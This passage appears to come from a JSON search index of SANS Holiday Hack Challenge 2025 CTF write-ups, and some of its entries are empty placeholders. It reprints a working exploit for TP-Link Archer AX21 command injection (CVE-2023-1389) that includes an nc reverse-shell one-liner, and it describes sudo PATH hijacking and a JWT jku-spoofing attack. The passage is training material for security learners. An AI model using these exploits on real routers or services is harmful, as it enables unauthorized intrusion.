farmhouse to personally inspect two machines. The trip required long drives for both of them, and the final stretch of road was steep and eerie, adding to the sense of adventure. Upon arrival, they were welcomed warmly by Dr. Tom and his wife, who gave them a detailed tour of the collection and took photographs throughout the visit.\nBefore making a purchase, Ed insisted on testing the Enigma‚Äôs functionality. Using an Enigma simulation app on his iPad, he encoded a message and verified that the real machine decoded it correctly. Satisfied with the test, he and Josh sat down to a surprisingly elegant lunch prepared by their hosts.\nAfter reviewing the two available units‚ÄîA2200 and A726‚Äîthey decided to purchase A726. The visit was filled with quirky moments, enthusiastic hospitality, and a sense of stepping into the home of someone deeply passionate about historical cryptography.\nThe transaction was completed successfully, and Ed and Josh left with a functioning Enigma machine and a story far more memorable than a simple equipment purchase. The narrative closes by reflecting on how the Enigma symbolizes both the deceptive confidence of flawed security and the ingenuity of those who unraveled it‚Äîwhile their journey highlights the unpredictable and strangely delightful experiences life offers.\nEd‚Äôs page It appears true that he owns a leaf of the Gutenberg Bible, according to this text found over at the Cyphercon site:",
    "description": "Objective Difficulty: 1/5\nFind Ed Skoudis upstairs in City Hall and help him troubleshoot a clever phishing tool in his cozy office.\nEd Skoudis mission statement I‚Äôm the Founder of Counter Hack Innovations, the team that brings you the SANS Holiday Hack Challenge for the last 22 years.\nI‚Äôm also the President of the SANS Technology Institute College, which has over 2,300 students studying for their Bachelor‚Äôs Degrees, Master‚Äôs Degrees, and various certificates.",
    "tags": [],
    "title": "Its All About Defang",
    "uri": "/act1/its-all-about-defang/index.html"
  },
  {
    "breadcrumb": "Intro",
    "content": "The Gnomes want to transform the neighborhood so that it‚Äôs frozen solid year-round, an environmental disaster. But who is the mastermind behind the Gnomes‚Äô wickedness?",
    "description": "The Gnomes want to transform the neighborhood so that it‚Äôs frozen solid year-round, an environmental disaster. But who is the mastermind behind the Gnomes‚Äô wickedness?",
    "tags": [],
    "title": "Act 3",
    "uri": "/act3/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 3",
    "content": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "description": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "tags": [],
    "title": "Schr√∂dingers Scope",
    "uri": "/act3/schrodingers-scope/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 2",
    "content": "Objective Difficulty: 2/5\nDrop by JJ‚Äôs 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router‚Äôs config?\nJanusz Jasinski mission statement Hello! I‚Äôm JJ. I like rock, metal, and punk music. That‚Äôs all I have to say about that.\nI accept BTC.\nSkeletor is my hero\nAlright then. Those bloody gnomes ‚Äòave proper messed about with the neighborhood‚Äôs wifi - changed the admin password, probably mucked up all the settings, the lot.\nNow I can‚Äôt get online and it‚Äôs doing me ‚Äôead in, innit?\nWe own this router, so we‚Äôre just takin‚Äô back what‚Äôs ours, yeah?\nYou reckon you can ‚Äôelp me ‚Äòack past whatever chaos these little blighters left be‚Äôind?\nDosis Network Down From the landing page we see a lot of information about the router:\nDosis Neighborhood Core Router AX1800 Wi-Fi 6 Router Firmware Version: 1.1.4 Build 20230219 rel.69802 Hardware Version: Archer AX21 v2.0 This information is kinda in your face and after Googling it, I found out this is most likely an TP-Link Archer AX21 and it has an interesting remote code execution flaw and a POC: https://www.exploit-db.com/exploits/51677.\nThis is the POC:\n#!/usr/bin/python3 # # Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection # Date: 07/25/2023 # Exploit Author: Voyag3r (https://github.com/Voyag3r-Security) # Vendor Homepage: https://www.tp-link.com/us/ # Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 (https://www.tenable.com/cve/CVE-2023-1389) # Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0 # CVE: CVE-2023-1389 # # Disclaimer: This script is intended to be used for educational purposes only. # Do not run this against any system that you do not have permission to test. # The author will not be held responsible for any use or damage caused by this # program. # # CVE-2023-1389 is an unauthenticated command injection vulnerability in the web # management interface of the TP-Link Archer AX21 (AX1800), specifically, in the # *country* parameter of the *write* callback for the *country* form at the # \"/cgi-bin/luci/;stok=/locale\" endpoint. By modifying the country parameter it is # possible to run commands as root. Execution requires sending the request twice; # the first request sets the command in the *country* value, and the second request # (which can be identical or not) executes it. # # This script is a short proof of concept to obtain a reverse shell. To read more # about the development of this script, you can read the blog post here: # https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94 # Before running the script, start a nc listener on your preferred port -\u003e run the script -\u003e profit import requests, urllib.parse, argparse from requests.packages.urllib3.exceptions import InsecureRequestWarning # Suppress warning for connecting to a router with a self-signed certificate requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # Take user input for the router IP, and attacker IP and port parser = argparse.ArgumentParser() parser.add_argument(\"-r\", \"--router\", dest = \"router\", default = \"192.168.0.1\", help=\"Router name\") parser.add_argument(\"-a\", \"--attacker\", dest = \"attacker\", default = \"127.0.0.1\", help=\"Attacker IP\") parser.add_argument(\"-p\", \"--port\",dest = \"port\", default = \"9999\", help=\"Local port\") args = parser.parse_args() # Generate the reverse shell command with the attacker IP and port revshell = urllib.parse.quote(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc \" + args.attacker + \" \" + args.port + \" \u003e/tmp/f\") # URL to obtain the reverse shell url_command = \"https://\" + args.router + \"/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(\" + revshell + \")\" # Send the URL twice to run the command. Sending twice is necessary for the attack r = requests.get(url_command, verify=False) r = requests.get(url_command, verify=False) Interesting. By the look of it we are able to send commands to this endpoint: /cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(\" + \u003ccommand_here\u003e + \"). howver, from the two last lines we must run the command twice in order for it to work. The POC uses a reverse shell, in tradion with SANS Holiday Hack Challenge I seriously doubt they expect us to do that. Instead, I took the route by customizing the POC to take my command as input and pass it on, then just print out the results from the second request:\nimport requests, urllib.parse, argparse from requests.packages.urllib3.exceptions import InsecureRequestWarning from pprint import pprint # Suppress warning for connecting to a router with a self-signed certificate requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # command = \"ls -la /etc/init.d/\" parser = argparse.ArgumentParser() parser.add_argument(\"command\", help=\"Local port\") args = parser.parse_args() command = args.command router = \"dosis-network-down.holidayhackchallenge.com\" url_command = f\"https://{router}/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$({command})\" pprint(url_command) r1 = requests.get(url_command, verify=False) r2 = requests.get(url_command, verify=False) print(r2.text) To operate this script we simply do:\npython3 main.py \"command here\" Example:\npython3 main.py \"ls */*\" The objective states that we have to find the WiFi password in the config, so what better place is it to look at /etc/config\npython3 main.py \"ls /etc/config\" This is the output from my script:\n('https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(ls ' '/etc/config)') dhcp firewall leds network system wireless Since we are aiming to uncover the WiFi password, lets take a closer look at wireless:\n('https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(cat ' '/etc/config/wireless)') config wifi-device 'radio0' option type 'mac80211' option channel '6' option hwmode '11g' option path 'platform/ahb/18100000.wmac' option htmode 'HT20' option country 'US' config wifi-device 'radio1' option type 'mac80211' option channel '36' option hwmode '11a' option path 'pci0000:00/0000:00:00.0' option htmode 'VHT80' option country 'US' config wifi-iface 'default_radio0' option device 'radio0' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_2.4G' option encryption 'psk2' option key 'SprinklesAndPackets2025!' config wifi-iface 'default_radio1' option device 'radio1' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_5G' option encryption 'psk2' option key 'SprinklesAndPackets2025!' And there we have it, the password is SprinklesAndPackets2025!\nJanusz Jasinski mission debrief Brilliant work, that. Got me connection back and sent those gnomes packin‚Äô from the router.\nNow I can finally get back to streamin‚Äô some proper metal. BTC tips accepted, by the way.",
    "description": "Objective Difficulty: 2/5\nDrop by JJ‚Äôs 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router‚Äôs config?\nJanusz Jasinski mission statement Hello! I‚Äôm JJ. I like rock, metal, and punk music. That‚Äôs all I have to say about that.\nI accept BTC.\nSkeletor is my hero\nAlright then. Those bloody gnomes ‚Äòave proper messed about with the neighborhood‚Äôs wifi - changed the admin password, probably mucked up all the settings, the lot.",
    "tags": [],
    "title": "Dosis Network Down",
    "uri": "/act2/dosis-network-down/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 1",
    "content": "Objective Difficulty: 1/5\nAssist Kyle at the old data center with a fire alarm that just won‚Äôt chill.\nKyle Parrish mission statement If you spot a fire, let me know! I‚Äôm Kyle, and I‚Äôve been around the Holiday Hack Challenge scene for years as arnydo - picked up multiple Super Honorable Mentions along the way.\nWhen I‚Äôm not fighting fires or hunting vulnerabilities, you‚Äôll find me on a unicycle or juggling - I once showed up a professional clown with his own clubs!\nMy family and I love exploring those East Tennessee mountains, and honestly, geocaching teaches you a lot about finding hidden things - useful in both firefighting and hacking.\nAnyway, I could use some help here. This fire alarm keeps going nuts but there‚Äôs no fire. I checked.\nI think someone has locked us out of the system. Can you see if you can get back in?\nNeigboorhood Fire Alarm System üö® EMERGENCY ALERT: Fire alarm system admin access has been compromised! üö® The fire safety systems are experiencing interference and admin privileges have been mysteriously revoked. The neighborhood‚Äôs fire protection infrastructure is at risk!\n‚ö†Ô∏è CURRENT STATUS: Limited to standard user access only üîí FIRE SAFETY SYSTEMS: Partially operational but restricted üéØ MISSION CRITICAL: Restore full fire alarm system control\nYour mission: Find a way to bypass the current restrictions and elevate to fire safety admin privileges. Once you regain full access, run the special command /etc/firealarm/restore_fire_alarm to restore complete fire alarm system control and protect the Dosis neighborhood from potential emergencies.\nThe above text is copied from the welcome screen for this terminal (below). As we can see for this terminal there aren‚Äôt that many tips or hints available. So I instantly begun think we‚Äôre in a classical situation where we have to look deeper into the terminal to find out more.\nSince we have no information, and in such games like this, I usually list out the contents right there at the entrypoint, using command ls -la:\nNot much in this folder except a bin folder, which tells me that users command most like are meant to run from this. What better to do than to list its contents and try to uncover what lives in this folder?\nSo, I am not allowed to run that runtoanswer binary? So - yes, that would be my goal here. To find a way to execute it. Tradiotionally on other CTF platform like TryHackMe and Hack The Box we usually list out what sudo permissions this user has (sudo -l to rescue):\nOkay, this user has the rights to execute a shell script using sudo. Finding out what this shell scripts does:\nHow cute. It‚Äôs a sugary wrapper around some system utilities to list out usage metrics. From the script I see it uses echo, df, free, ps, grep, and head - all without using full paths! This means I can create my own version of one of them to spawn a Bash shell and gain access as root (toot toot)! I suppose this is why that lonely bin folder even exist (for me to put my copy of a said utility in and execute).\nSo my plan is to create my own version of df in the local bin folder, then add a call to Bash into it, assign SUID and Executable flag to it. Then run that SUDO command and hope for the best:\nExuting my malicious df script and hoping for the best! And would you look at that, I got ROOT and can run that runtoanswer binary! Yay!\nKyle Parrish mission debrief Wow! Thank you so much! I didn‚Äôt realize sudo was so powerful. Especially when misconfigured. Who knew a simple privilege escalation could unlock the whole fire safety system?\nNow‚Ä¶ will you sudo make me a sandwich?",
    "description": "Objective Difficulty: 1/5\nAssist Kyle at the old data center with a fire alarm that just won‚Äôt chill.\nKyle Parrish mission statement If you spot a fire, let me know! I‚Äôm Kyle, and I‚Äôve been around the Holiday Hack Challenge scene for years as arnydo - picked up multiple Super Honorable Mentions along the way.\nWhen I‚Äôm not fighting fires or hunting vulnerabilities, you‚Äôll find me on a unicycle or juggling - I once showed up a professional clown with his own clubs!",
    "tags": [],
    "title": "Neighborhood Watch Bypass",
    "uri": "/act1/neighborhood-watch-bypass/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 3",
    "content": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "description": "Objective Difficulty: 1/5\nSkate over to Jared at the frozen pond for some network magic and learn the ropes by the hockey rink.\nXXX mission statement Solution XXX mission debrief",
    "tags": [],
    "title": "Find and Shutdown Frostys Snowglobe Machine",
    "uri": "/act3/find-and-shutdown-frostys-snowglobe-machine/index.html"
  },
  {
    "breadcrumb": "Intro¬†\u003e¬†Act 2",
    "content": "Objective Difficulty: 2/5\nHike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?\nPaul Beckett mission statement Hey, I‚Äôm Paul!\nI‚Äôve been at Counter Hack since 2024 and loving every minute of it.\nI‚Äôm a pentester who digs into web, API, and mobile apps, and I‚Äôm also a fan of Linux.\nWhen I‚Äôm not hacking away, you can catch me enjoying board games, hiking, or paddle boarding!\nSomething‚Äôs afoot, but the details aren‚Äôt sorted. Do pop back - you‚Äôll want in on this.\nAs a pentester, I proper love a good privilege escalation challenge, and that‚Äôs exactly what we‚Äôve got here.\nI‚Äôve got access to a Gnome‚Äôs Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it‚Äôs just a low-privilege account.\nThe gnomes are getting some dodgy updates, and I need admin access to see what‚Äôs actually going on.\nReady to help me find a way to bump up our access level, \u003e yeah?\nRogue Gnome Terminal Already from the initial chat with Paul we get some credentials and useful information:\nCreds: gnome:SittingOnAShelf Address: gnome-48371.atnascorp Logging into the terminal and reading the welcome text we are presented with some helpful hints:\nThe welcome text mentions notes in file ~/notes :\nFor clarity, these are the notes:\n# Sites ## Captured Gnome: curl http://gnome-48371.atnascorp/ ## ATNAS Identity Provider (IdP): curl http://idp.atnascorp/ ## My CyberChef website: curl http://paulweb.neighborhood/ ### My CyberChef site html files: ~/www/ # Credentials ## Gnome credentials (found on a post-it): Gnome:SittingOnAShelf # Curl Commands Used in Analysis of Gnome: ## Gnome Diagnostic Interface authentication required page: curl http://gnome-48371.atnascorp ## Request IDP Login Page curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth ## Authenticate to IDP curl -X POST --data-binary $'username=gnome\u0026password=SittingOnAShelf\u0026return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login ## Pass Auth Token to Gnome curl -v http://gnome-48371.atnascorp/auth?token=\u003cinsert-JWT\u003e ## Access Gnome Diagnostic Interface curl -H 'Cookie: session=\u003cinsert-session\u003e' http://gnome-48371.atnascorp/diagnostic-interface ## Analyze the JWT jwt_tool.py \u003cinsert-JWT\u003e Validating the authentication flow Request the IDP login page Making sure we can reach the ODP login page:\ncurl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth Obtaining token Logging in using the credentials provided to retrieve JWT token:\ncurl -X POST --data-binary $'username=gnome\u0026password=SittingOnAShelf\u0026return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login Sure, it works. We got a JWT token:\n\u003c!doctype html\u003e \u003chtml lang=en\u003e \u003ctitle\u003eRedirecting...\u003c/title\u003e \u003ch1\u003eRedirecting...\u003c/h1\u003e \u003cp\u003eYou should be redirected automatically to the target URL: \u003ca href=\"http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQwNTYwMSwiZXhwIjoxNzY0NDEyODAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.jL0eAsQOkMuLYAKPRzLK_Y50EY2JdtOYjgwQlJrTtLgJDQhHyZ9U5ReYrYgL4uzO0SeAVV7t_at3tS9y282uwaZ1OuPXGc_SzG2WTh-15TFnG-yJ-bjTUaNayHlyYRSHn1S18taA9kV12Gc9pBnBZJmxDEB1hhfXa6EibHavmVs5FU0uJK2p4h7GEP3tqqJ315tWmyf2ZQJnp-IAHHOp1aoSSL4TlWnVtoUqWtmZxeDegdlXPTaAbhu4xW7j0iHkJt1RRw3JeegpmyS2i4FyDdApL8Run3Po_HDkcuYOcquX_3GyTi_FdGaJezxj3s8QGaZySszOt8juUfcOptx40w\"\u003ehttp://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQwNTYwMSwiZXhwIjoxNzY0NDEyODAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.jL0eAsQOkMuLYAKPRzLK_Y50EY2JdtOYjgwQlJrTtLgJDQhHyZ9U5ReYrYgL4uzO0SeAVV7t_at3tS9y282uwaZ1OuPXGc_SzG2WTh-15TFnG-yJ-bjTUaNayHlyYRSHn1S18taA9kV12Gc9pBnBZJmxDEB1hhfXa6EibHavmVs5FU0uJK2p4h7GEP3tqqJ315tWmyf2ZQJnp-IAHHOp1aoSSL4TlWnVtoUqWtmZxeDegdlXPTaAbhu4xW7j0iHkJt1RRw3JeegpmyS2i4FyDdApL8Run3Po_HDkcuYOcquX_3GyTi_FdGaJezxj3s8QGaZySszOt8juUfcOptx40w\u003c/a\u003e. If not, click the link. Authenticating to gnome-48371.atnascorp With token we just obtained, we can now go ahead and authentice to `gnome-48371.atnascorp``:\ncurl -v -L http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQwNTYwMSwiZXhwIjoxNzY0NDEyODAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.jL0eAsQOkMuLYAKPRzLK_Y50EY2JdtOYjgwQlJrTtLgJDQhHyZ9U5ReYrYgL4uzO0SeAVV7t_at3tS9y282uwaZ1OuPXGc_SzG2WTh-15TFnG-yJ-bjTUaNayHlyYRSHn1S18taA9kV12Gc9pBnBZJmxDEB1hhfXa6EibHavmVs5FU0uJK2p4h7GEP3tqqJ315tWmyf2ZQJnp-IAHHOp1aoSSL4TlWnVtoUqWtmZxeDegdlXPTaAbhu4xW7j0iHkJt1RRw3JeegpmyS2i4FyDdApL8Run3Po_HDkcuYOcquX_3GyTi_FdGaJezxj3s8QGaZySszOt8juUfcOptx40w Sure enough, it works - and we got a session cookie as well:\n* Host gnome-48371.atnascorp:80 was resolved. * IPv6: (none) * IPv4: 127.0.0.1 * Trying 127.0.0.1:80... * Connected to gnome-48371.atnascorp (127.0.0.1) port 80 \u003e GET /auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQwNTYwMSwiZXhwIjoxNzY0NDEyODAxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.jL0eAsQOkMuLYAKPRzLK_Y50EY2JdtOYjgwQlJrTtLgJDQhHyZ9U5ReYrYgL4uzO0SeAVV7t_at3tS9y282uwaZ1OuPXGc_SzG2WTh-15TFnG-yJ-bjTUaNayHlyYRSHn1S18taA9kV12Gc9pBnBZJmxDEB1hhfXa6EibHavmVs5FU0uJK2p4h7GEP3tqqJ315tWmyf2ZQJnp-IAHHOp1aoSSL4TlWnVtoUqWtmZxeDegdlXPTaAbhu4xW7j0iHkJt1RRw3JeegpmyS2i4FyDdApL8Run3Po_HDkcuYOcquX_3GyTi_FdGaJezxj3s8QGaZySszOt8juUfcOptx40w HTTP/1.1 \u003e Host: gnome-48371.atnascorp \u003e User-Agent: curl/8.5.0 \u003e Accept: */* \u003e \u003c HTTP/1.1 302 FOUND \u003c Date: Sat, 29 Nov 2025 08:41:32 GMT \u003c Server: Werkzeug/3.0.1 Python/3.12.3 \u003c Content-Type: text/html; charset=utf-8 \u003c Content-Length: 229 \u003c Location: /diagnostic-interface \u003c Vary: Cookie \u003c Set-Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aSqxvA.da6mDv_KbrbamiMFrRFIN2cFqcw; HttpOnly; Path=/ \u003c \u003c!doctype html\u003e \u003chtml lang=en\u003e \u003ctitle\u003eRedirecting...\u003c/title\u003e \u003ch1\u003eRedirecting...\u003c/h1\u003e \u003cp\u003eYou should be redirected automatically to the target URL: \u003ca href=\"/diagnostic-interface\"\u003e/diagnostic-interface\u003c/a\u003e. If not, click the link. * Connection #0 to host gnome-48371.atnascorp left intact By passing the session cookie with the request I can access the /diagnostic-interface:\ncurl -H 'Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aSqxvA.da6mDv_KbrbamiMFrRFIN2cFqcw' http://gnome-48371.atnascorp/diagnostic-interface However, it states that access is for admins only:\n\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eAtnasCorp : Gnome Diagnostic Interface\u003c/title\u003e \u003clink rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\"\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eAtnasCorp : Gnome Diagnostic Interface\u003c/h1\u003e \u003cp\u003eWelcome gnome\u003c/p\u003e\u003cp\u003eDiagnostic access is only available to admins.\u003c/p\u003e \u003c/body\u003e By this we I have now validated that the command line sequence indeed works and leads to successful authentication. However, the welcome screen states that ‚ÄòDiagnostic access‚Äô is only availabel to admins. Since we are dealing with JWT here, it is time to dissect it to see if we can utilize it to get admin access.\nInspecting JWT I am fully aware that ¬¥notes¬¥ file hinted at using the jwt_tool - but for inspecting JWT‚Äôs I defaulted to using my goto tool JWT.io:\nMost likely we can just change admin key to true and hope for the best! However - things are seldom so easy - as we will se in the next section.\nSolution For solving this terminal I decided to start from scratch, thus terminating and starting a new terminal.\nObtain JWT Token Just like earlier, I started getting a JWT Token:\ncurl -X POST --data-binary $'username=gnome\u0026password=SittingOnAShelf\u0026return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login The token:\n\u003c!doctype html\u003e \u003chtml lang=en\u003e \u003ctitle\u003eRedirecting...\u003c/title\u003e \u003ch1\u003eRedirecting...\u003c/h1\u003e \u003cp\u003eYou should be redirected automatically to the target URL: \u003ca href=\"http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMTM4MSwiZXhwIjoxNzY0NDE4NTgxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.PZ7wPV0dM4W35hakhc2elX6NaSXKCRflU0C4vWwOd1p9qaynIafm-AP4zteoIOciXB82aFPmbNYolG6Od13y4nn9NT-nypRtj2NjFsMf53OFcGRd_MjK5rFhtClDRHk0mtTrPNhsdAdJnv2IXj-g6KkVrEmU8A1qRPvrHNqabzRP6gfuqz__hWv71CKHnI1IzOJ6RNJnzRNirir2xVsUqXSKPw4T1K3vmvsVUBM3o1EZjZm2OTIh3wb7t1XFVkg62O3BBEoypIyziE9-hZeHqO9YgYfjtrB-o2qNGSk64tBJwxWCEySoT9FjvFasoUKIGneVP6pkHSkhMFKCvaxXyQ\"\u003ehttp://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMTM4MSwiZXhwIjoxNzY0NDE4NTgxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.PZ7wPV0dM4W35hakhc2elX6NaSXKCRflU0C4vWwOd1p9qaynIafm-AP4zteoIOciXB82aFPmbNYolG6Od13y4nn9NT-nypRtj2NjFsMf53OFcGRd_MjK5rFhtClDRHk0mtTrPNhsdAdJnv2IXj-g6KkVrEmU8A1qRPvrHNqabzRP6gfuqz__hWv71CKHnI1IzOJ6RNJnzRNirir2xVsUqXSKPw4T1K3vmvsVUBM3o1EZjZm2OTIh3wb7t1XFVkg62O3BBEoypIyziE9-hZeHqO9YgYfjtrB-o2qNGSk64tBJwxWCEySoT9FjvFasoUKIGneVP6pkHSkhMFKCvaxXyQ\u003c/a\u003e. If not, click the link Decoding token This time around decoding the token, I used the jwt_tool utility. This mostly for getting the hang of this tool:\njwt_tool.py 'eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NDQxMTM4MSwiZXhwIjoxNzY0NDE4NTgxLCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.PZ7wPV0dM4W35hakhc2elX6NaSXKCRflU0C4vWwOd1p9qaynIafm-AP4zteoIOciXB82aFPmbNYolG6Od13y4nn9NT-nypRtj2NjFsMf53OFcGRd_MjK5rFhtClDRHk0mtTrPNhsdAdJnv2IXj-g6KkVrEmU8A1qRPvrHNqabzRP6gfuqz__hWv71CKHnI1IzOJ6RNJnzRNirir2xVsUqXSKPw4T1K3vmvsVUBM3o1EZjZm2OTIh3wb7t1XFVkg62O3BBEoypIyziE9-hZeHqO9YgYfjtrB-o2qNGSk64tBJwxWCEySoT9FjvFasoUKIGneVP6pkHSkhMFKCvaxXyQ' There are a few things we must be aware of here:\n[+] alg = \"RS256\" [+] jku = \"http://idp.atnascorp/.well-known/jwks.json\" [+] kid = \"idp-key-2025\" [+] typ = \"JWT\" Roughly the abbreviations here translates into:\nAbbreviation Meaning alg Algorithm used to sign the JWT (e.g., RS256, HS256). jku JSON Web Key URL - points to a JWKS endpoint containing public keys for verifying the token. kid Key ID - identifies which key inside the JWKS was used to sign the token. typ Type - indicates the token type (usually ‚ÄúJWT‚Äù). Inspecting jwks.json Obtaining the jwks.json file referenced in the JSON Web Key URL (jku) part:\ncurl http://idp.atnascorp/.well-known/jwks.json As we can see it gives some interesting information:\n{ \"keys\": [ { \"e\": \"AQAB\", \"kid\": \"idp-key-2025\", \"kty\": \"RSA\", \"n\": \"7WWfvxwIZ44wIZqPFP9EEemmwMhKgBakYPx736W5gGD8YJlmMzanxdi8NANJ6kyMN-ErFOKJuIQn01PmAeq7On4OCwLyQpB5dHXiidZPRjb2lbrrL1k32svdeo6VGCnzdrGu6KtDHxHn8m9H3WqGVmi2OmCZsk6fJbnoklnJaFiygUkC4IMbk92cbYvajPTqV9C6yWCROPagxQFmybq1hNJoY-FRntEKwBN89Dow8d-PsGMten3CmzDQ9o8rXKs6euk9xLfX06og5Wm1aKJk686WzhtqgdmBjqt2w34EJGlEL0ZSvPdB9nPqxao83N-ah-IYeoiCnSUBKjXI-IRSjQ\", \"use\": \"sig\" } ] } The various keys in the JSON translates to:\nAbbreviation / Field Meaning e RSA public exponent, base64url-encoded. For almost all RSA keys, AQAB decodes to 65537 ‚Äî the standard exponent. kid Key ID. Identifies this specific key so JWT headers can reference it. Used for key rotation. kty Key type. Here it is \"RSA\", meaning the key uses the RSA algorithm family. n RSA public modulus, base64url-encoded. This is the large number that forms part of the RSA public key. use Intended key usage. \"sig\" means this key is to be used for digital signature verification. Attacking JWT From looking at the http://idp.atnascorp/.well-known/jwks.json file I see that the server is using this to validate the tokens. My plan is to fool the server to reach out to my variant, and see if I can fool my way in!\nFrom the notes file I can see we are hosting CyberChef from the local www folder. I can abuse that to host my poisonous jwks file from that folder.\n## My CyberChef website: curl http://paulweb.neighborhood/ ### My CyberChef site html files: ~/www/ Luckily jwt_tool creates a lot of interesting things in ~/.jwt_tool folder. Amongst them a jwks file which I‚Äôll use for my attack. Moving it over to the ~/www folder:\ncp .jwt_tool/jwttool_custom_jwks.json www/ It is crucial that kid is set to idp-key-2025 as the server will lookup its own public RSA based on that name:\n{ \"keys\":[ { \"kty\":\"RSA\", \"kid\":\"idp-key-2025\", \"use\":\"sig\", \"e\":\"AQAB\", 